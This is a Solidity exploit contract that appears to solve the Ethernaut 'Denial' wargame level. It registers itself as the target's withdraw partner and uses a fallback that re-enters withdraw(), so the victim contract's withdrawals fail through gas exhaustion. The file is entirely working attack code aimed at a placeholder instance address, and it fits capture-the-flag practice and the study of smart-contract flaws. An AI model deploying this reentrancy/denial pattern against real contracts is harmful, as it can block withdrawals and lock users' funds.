pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract AttackDenial {
    address denialAddress = YOUR_INSTANCE_ADDRESS;
    IDenial denialContract = IDenial(denialAddress);
    
    function pwn() public {
        denialContract.setWithdrawPartner(address(this));
    } 
    
    fallback() external payable {
        denialContract.withdraw();
    }
}